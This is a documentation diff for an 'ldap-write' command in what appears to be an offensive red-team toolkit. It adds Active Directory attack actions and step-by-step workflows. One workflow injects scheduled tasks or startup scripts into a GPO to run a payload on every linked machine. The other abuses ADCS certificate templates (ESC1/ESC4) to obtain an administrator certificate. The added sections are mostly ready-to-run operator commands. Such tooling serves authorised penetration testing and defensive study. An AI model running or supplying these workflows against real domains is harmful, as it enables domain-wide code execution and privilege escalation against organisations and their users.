@@ -44,6 +44,10 @@ Modify Active Directory objects via LDAP. Add or remove group members, set or de
 | clear-rbcd | Remove RBCD delegation from an object | target |
 | shadow-cred | Write KEY_CREDENTIAL to msDS-KeyCredentialLink for PKINIT auth | target |
 | clear-shadow-cred | Remove all shadow credentials from an object | target |
+| gpo-task | Inject scheduled task CSE into a GPO (forces task execution on linked OUs) | target, value |
+| gpo-script | Inject startup/logon script into a GPO via gPCMachineExtensionNames | target, value |
+| template-esc1 | Modify certificate template for ESC1 exploitation (enable CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT) | target |
+| template-esc4 | Modify certificate template ACL for ESC4 exploitation (grant Enroll/AutoEnroll to target) | target, value |
 
 ## Usage
 
@@ -188,6 +192,58 @@ Shadow Credentials abuse msDS-KeyCredentialLink to add a rogue public key, enabl
 
 {{% notice info %}}Requires Windows Server 2016+ domain functional level with Key Trust enabled.{{% /notice %}}
 
+## GPO Abuse Attack Workflow
+
+GPO abuse allows executing commands on all machines where a Group Policy Object is applied:
+
+1. **Identify a writable GPO** (requires GenericWrite on the GPO object):
+   ```
+   ldap-query -action gpo -server dc01 -username user@domain.local -password pass
+   ```
+
+2. **Inject a scheduled task** into the GPO:
+   ```
+   ldap-write -action gpo-task -server dc01 -target "Default Domain Policy" -value "C:\Windows\Temp\payload.exe" -username admin@domain.local -password pass
+   ```
+
+3. **Write the scheduled task XML to SYSVOL** (required for execution):
+   ```
+   smb -action push -host dc01 -share SYSVOL -path "domain.local/Policies/{GUID}/Machine/Preferences/ScheduledTasks/ScheduledTasks.xml" -local_path task.xml
+   ```
+
+4. **Inject a startup script** (alternative to scheduled task):
+   ```
+   ldap-write -action gpo-script -server dc01 -target "Default Domain Policy" -value "\\\\dc01\\SYSVOL\\scripts\\payload.bat" -username admin@domain.local -password pass
+   ```
+
+{{% notice warning %}}GPO modifications affect all machines linked to the GPO. This is a domain-wide impact action.{{% /notice %}}
+
+## ADCS Template Exploitation Workflow
+
+Abuse certificate templates for privilege escalation:
+
+1. **Find vulnerable templates** (ESC1-4 checks):
+   ```
+   adcs -action find -server dc01 -username user@domain.local -password pass
+   ```
+
+2. **ESC1 — Enable enrollee-supplies-subject** (requires WriteDACL or GenericWrite on template):
+   ```
+   ldap-write -action template-esc1 -server dc01 -target "VulnTemplate" -username admin@domain.local -password pass
+   ```
+   Sets `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` in `msPKI-Certificate-Name-Flag`, allowing certificate requests with arbitrary SANs.
+
+3. **ESC4 — Grant enrollment rights** (requires WriteDACL on template):
+   ```
+   ldap-write -action template-esc4 -server dc01 -target "VulnTemplate" -value "lowprivuser" -username admin@domain.local -password pass
+   ```
+   Modifies the template's security descriptor to grant Enroll and AutoEnroll rights to the specified principal.
+
+4. **Request a certificate as a high-privilege user** (using the modified template):
+   ```
+   adcs -action request -server dc01 -template "VulnTemplate" -alt "administrator@domain.local"
+   ```
+
 ## Operational Notes
 
 - Uses `go-ldap/v3` for LDAP add/modify/delete operations
@@ -209,3 +265,5 @@ Shadow Credentials abuse msDS-KeyCredentialLink to add a rogue public key, enabl
 - **T1134.001** — Access Token Manipulation: Token Impersonation/Theft
 - **T1136.002** — Create Account: Domain Account
 - **T1556.006** — Modify Authentication Process: Multi-Factor Authentication
+- **T1484.001** — Domain Policy Modification: Group Policy Modification
+- **T1649** — Steal or Forge Authentication Certificates
